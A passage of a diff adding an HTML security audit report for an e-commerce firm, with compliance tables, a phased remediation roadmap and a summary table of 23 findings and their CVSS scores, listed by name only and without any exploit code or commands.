+                    <div class="progress-track">
+                        <div class="progress-fill pcidss" style="width: 30%;"></div>
+                    </div>
+                    <div class="progress-label">
+                        <span>30% Compliant</span>
+                        <span style="color: var(--accent-red);">Critical -- Fails key requirements</span>
+                    </div>
+                    <table class="data-table" style="margin-top:12px; font-size:0.8em;">
+                        <tr><th>Requirement</th><th>Status</th></tr>
+                        <tr><td>2.2 -- System configuration</td><td style="color: var(--critical);">FAIL -- TLS 1.0 (SC-008)</td></tr>
+                        <tr><td>6.2 -- Vulnerability management</td><td style="color: var(--critical);">FAIL -- SQLi (SC-001)</td></tr>
+                        <tr><td>6.4 -- Secure SDLC</td><td style="color: var(--high);">FAIL -- No code review</td></tr>
+                        <tr><td>6.5 -- Coding practices</td><td style="color: var(--critical);">FAIL -- Multiple vulns</td></tr>
+                        <tr><td>8.2 -- Authentication mgmt</td><td style="color: var(--critical);">FAIL -- JWT (SC-002)</td></tr>
+                        <tr><td>10.1 -- Audit trails</td><td style="color: var(--medium);">Partial -- SC-022</td></tr>
+                        <tr><td>10.3 -- Log entries</td><td style="color: var(--high);">FAIL -- Data in errors</td></tr>
+                    </table>
+                </div>
+                <div class="compliance-item">
+                    <div class="compliance-name">LGPD</div>
+                    <div class="compliance-desc">Brazilian General Data Protection Law (Lei 13.709/2018)</div>
+                    <div class="progress-track">
+                        <div class="progress-fill lgpd" style="width: 60%;"></div>
+                    </div>
+                    <div class="progress-label">
+                        <span>60% Compliant</span>
+                        <span style="color: var(--accent-yellow);">Needs Improvement</span>
+                    </div>
+                    <table class="data-table" style="margin-top:12px; font-size:0.8em;">
+                        <tr><th>Article</th><th>Status</th></tr>
+                        <tr><td>Art. 46 -- Security measures</td><td style="color: var(--critical);">FAIL -- Data exposure</td></tr>
+                        <tr><td>Art. 48 -- Breach notification</td><td style="color: var(--medium);">Partial</td></tr>
+                        <tr><td>Art. 50 -- Best practices</td><td style="color: var(--medium);">Partial -- Encryption</td></tr>
+                        <tr><td>Data minimization</td><td style="color: var(--low);">Partial</td></tr>
+                        <tr><td>Privacy by design</td><td style="color: var(--low);">Partial</td></tr>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- REMEDIATION ROADMAP -->
+        <div class="section">
+            <h2 class="section-title">Remediation Roadmap</h2>
+            <div class="roadmap">
+                <div class="roadmap-item phase-1">
+                    <div class="roadmap-title" style="color: var(--critical);">Phase 1 -- Immediate (0-72 hours): Critical Findings</div>
+                    <div class="roadmap-timeline">Deadline: 2025-04-08 | Owner: DevOps Lead + Backend Team</div>
+                    <div class="roadmap-desc">
+                        <ul style="color: var(--text-secondary); font-size: 0.9em; margin-top: 8px; padding-left: 20px;">
+                            <li>SC-001: Patch SQL Injection using parameterized queries on all search endpoints</li>
+                            <li>SC-002: Rotate JWT secret immediately, implement JWKs rotation strategy</li>
+                            <li>SC-003: Disable verbose error responses in production, remove sensitive data from error payloads</li>
+                            <li>SC-004: Block SSRF by implementing URL allowlist and blocking internal IP ranges</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="roadmap-item phase-2">
+                    <div class="roadmap-title" style="color: var(--high);">Phase 2 -- Short-Term (1-2 weeks): High Findings</div>
+                    <div class="roadmap-timeline">Deadline: 2025-04-19 | Owner: Backend + Security Team</div>
+                    <div class="roadmap-desc">
+                        <ul style="color: var(--text-secondary); font-size: 0.9em; margin-top: 8px; padding-left: 20px;">
+                            <li>SC-005: Implement proper authorization checks (IDOR fix) on all order endpoints</li>
+                            <li>SC-006: Sanitize search input, implement Output Encoding (HTML entity encoding)</li>
+                            <li>SC-007: Implement session expiration (24h idle, 30d absolute), add HttpOnly/Secure/SameSite</li>
+                            <li>SC-008: Disable TLS 1.0 and 1.1, enforce TLS 1.2+ only with strong cipher suites</li>
+                            <li>SC-009: Implement rate limiting (e.g., 100 req/min per IP, 5 login attempts/minute)</li>
+                            <li>SC-010: Validate redirect URLs against allowlist, reject external domains</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="roadmap-item phase-3">
+                    <div class="roadmap-title" style="color: var(--medium);">Phase 3 -- Medium-Term (1-4 weeks): Medium Findings</div>
+                    <div class="roadmap-timeline">Deadline: 2025-05-03 | Owner: Frontend + DevOps Team</div>
+                    <div class="roadmap-desc">
+                        <ul style="color: var(--text-secondary); font-size: 0.9em; margin-top: 8px; padding-left: 20px;">
+                            <li>SC-011 through SC-018: Implement all security headers, fix CORS, upgrade password hashing, add CSRF tokens, sanitize review inputs</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="roadmap-item phase-4">
+                    <div class="roadmap-title" style="color: var(--low);">Phase 4 -- Long-Term (1-3 months): Low Findings + Hardening</div>
+                    <div class="roadmap-timeline">Deadline: 2025-07-05 | Owner: Development Team</div>
+                    <div class="roadmap-desc">
+                        <ul style="color: var(--text-secondary); font-size: 0.9em; margin-top: 8px; padding-left: 20px;">
+                            <li>SC-019 to SC-023: Add remaining security headers, disable TRACE, clean up robots.txt, update dependencies, implement comprehensive logging</li>
+                            <li>Deploy WAF (Web Application Firewall) as defense-in-depth</li>
+                            <li>Implement automated security scanning in CI/CD pipeline</li>
+                            <li>Schedule quarterly penetration tests</li>
+                            <li>Establish bug bounty program</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ALL FINDINGS SUMMARY TABLE -->
+        <div class="section">
+            <h2 class="section-title">Findings Summary Table</h2>
+            <div class="card" style="overflow-x: auto;">
+                <table class="data-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Finding</th>
+                            <th>Dept</th>
+                            <th>CVSS</th>
+                            <th>Severity</th>
+                            <th>Status</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td>SC-001</td><td>SQL Injection in Search</td><td><span class="dept-badge dept-websesc">WebSec</span></td><td>9.8</td><td><span class="badge-critical badge">Critical</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-002</td><td>JWT Token Forgery</td><td><span class="dept-badge dept-appsec">AppSec</span></td><td>9.1</td><td><span class="badge-critical badge">Critical</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-003</td><td>Sensitive Data in Errors</td><td><span class="dept-badge dept-websesc">WebSec</span></td><td>8.6</td><td><span class="badge-critical badge">Critical</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-004</td><td>SSRF via Image Upload</td><td><span class="dept-badge dept-appsec">AppSec</span></td><td>8.2</td><td><span class="badge-critical badge">Critical</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-005</td><td>IDOR on Orders</td><td><span class="dept-badge dept-appsec">AppSec</span></td><td>7.5</td><td><span class="badge-high badge">High</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-006</td><td>Reflected XSS in Search</td><td><span class="dept-badge dept-websesc">WebSec</span></td><td>7.4</td><td><span class="badge-high badge">High</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-007</td><td>Weak Session Mgmt</td><td><span class="dept-badge dept-appsec">AppSec</span></td><td>7.2</td><td><span class="badge-high badge">High</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-008</td><td>TLS 1.0/1.1 Enabled</td><td><span class="dept-badge dept-infrasec">InfraSec</span></td><td>7.0</td><td><span class="badge-high badge">High</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-009</td><td>No Rate Limiting</td><td><span class="dept-badge dept-appsec">AppSec</span></td><td>6.8</td><td><span class="badge-high badge">High</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-010</td><td>Open Redirect</td><td><span class="dept-badge dept-websesc">WebSec</span></td><td>6.5</td><td><span class="badge-high badge">High</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-011</td><td>Missing CSP Header</td><td><span class="dept-badge dept-websesc">WebSec</span></td><td>5.9</td><td><span class="badge-medium badge">Medium</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-012</td><td>Clickjacking</td><td><span class="dept-badge dept-websesc">WebSec</span></td><td>5.4</td><td><span class="badge-medium badge">Medium</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-013</td><td>Directory Listing</td><td><span class="dept-badge dept-infrasec">InfraSec</span></td><td>5.3</td><td><span class="badge-medium badge">Medium</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-014</td><td>CORS Wildcard</td><td><span class="dept-badge dept-websesc">WebSec</span></td><td>5.1</td><td><span class="badge-medium badge">Medium</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-015</td><td>Stored XSS in Reviews</td><td><span class="dept-badge dept-websesc">WebSec</span></td><td>5.8</td><td><span class="badge-medium badge">Medium</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-016</td><td>Tech Stack Disclosure</td><td><span class="dept-badge dept-infrasec">InfraSec</span></td><td>4.5</td><td><span class="badge-medium badge">Medium</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-017</td><td>No CSRF Protection</td><td><span class="dept-badge dept-appsec">AppSec</span></td><td>5.5</td><td><span class="badge-medium badge">Medium</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-018</td><td>MD5 Password Hash</td><td><span class="dept-badge dept-appsec">AppSec</span></td><td>5.9</td><td><span class="badge-medium badge">Medium</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-019</td><td>Missing X-Content-Type</td><td><span class="dept-badge dept-websesc">WebSec</span></td><td>3.7</td><td><span class="badge-low badge">Low</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-020</td><td>TRACE Method Enabled</td><td><span class="dept-badge dept-infrasec">InfraSec</span></td><td>3.1</td><td><span class="badge-low badge">Low</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-021</td><td>robots.txt Info Leak</td><td><span class="dept-badge dept-websesc">WebSec</span></td><td>2.6</td><td><span class="badge-low badge">Low</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-022</td><td>Suspicious Log Patterns</td><td><span class="dept-badge dept-incidentresp">IncidentResp</span></td><td>3.3</td><td><span class="badge-low badge">Low</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                        <tr><td>SC-023</td><td>Vuln Dependencies</td><td><span class="dept-badge dept-incidentresp">IncidentResp</span></td><td>3.0</td><td><span class="badge-low badge">Low</span></td><td style="color: var(--text-muted);">Open</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- TEAM CONTRIBUTION -->
+        <div class="section">
+            <h2 class="section-title">Department Contributions</h2>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 16px;">
+                <div class="card">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 12px;">
+                        <span class="dept-badge dept-websesc" style="font-size: 0.85em;">WebSec</span>
+                        <strong style="font-size: 1em;">Web Security Team</strong>
+                    </div>
+                    <p style="color: var(--text-secondary); font-size: 0.9em;">Automated and manual scanning of the web application for OWASP Top 10 vulnerabilities, security header analysis, input validation testing, and cross-site scripting detection.</p>
+                    <p style="color: var(--text-muted); font-size: 0.8em; margin-top: 8px;">Findings: SC-001, SC-003, SC-006, SC-010, SC-011, SC-012, SC-014, SC-015, SC-019, SC-021</p>
+                </div>
+                <div class="card">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 12px;">
+                        <span class="dept-badge dept-appsec" style="font-size: 0.85em;">AppSec</span>
+                        <strong style="font-size: 1em;">Application Security Team</strong>
+                    </div>
+                    <p style="color: var(--text-secondary); font-size: 0.9em;">Authentication and session management review, API security assessment, authorization testing, cryptographic analysis, and CSRF evaluation.</p>
+                    <p style="color: var(--text-muted); font-size: 0.8em; margin-top: 8px;">Findings: SC-002, SC-004, SC-005, SC-007, SC-009, SC-017, SC-018</p>
+                </div>
+                <div class="card">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 12px;">
+                        <span class="dept-badge dept-infrasec" style="font-size: 0.85em;">InfraSec</span>
+                        <strong style="font-size: 1em;">Infrastructure Security Team</strong>
+                    </div>
+                    <p style="color: var(--text-secondary); font-size: 0.9em;">Server configuration audit, TLS/SSL assessment, network security review, server information disclosure analysis, and directory configuration checks.</p>
+                    <p style="color: var(--text-muted); font-size: 0.8em; margin-top: 8px;">Findings: SC-008, SC-013, SC-016, SC-020</p>
+                </div>
+                <div class="card">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 12px;">
+                        <span class="dept-badge dept-incidentresp" style="font-size: 0.85em;">IncidentResp</span>
+                        <strong style="font-size: 1em;">Incident Response Team</strong>
+                    </div>
+                    <p style="color: var(--text-secondary); font-size: 0.9em;">Log analysis for signs of active exploitation, dependency vulnerability scanning, attack pattern correlation, and data exfiltration investigation.</p>
+                    <p style="color: var(--text-muted); font-size: 0.8em; margin-top: 8px;">Findings: SC-022, SC-023</p>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- FOOTER -->
+    <div class="footer">
+        <p><strong>Security Company</strong> -- Professional Security Audit Services</p>
+        <p>Report ID: SC-2025-00847 | Generated: 2025-04-05T18:30:00Z</p>
+        <p>This report is confidential and intended solely for SecureShop E-Commerce Ltd.</p>
+        <p style="margin-top: 12px; font-size: 0.8em;">
+            Assessed by: WebSec Department, AppSec Department, InfraSec Department, Incident Response Department<br>
+            Lead Auditor: Security Company Automated Scanning Framework v2.1 + Senior Analyst Review
+        </p>
+        <div class="classification">CONFIDENTIAL -- DO NOT DISTRIBUTE</div>
+    </div>
+
+</body>
+</html>
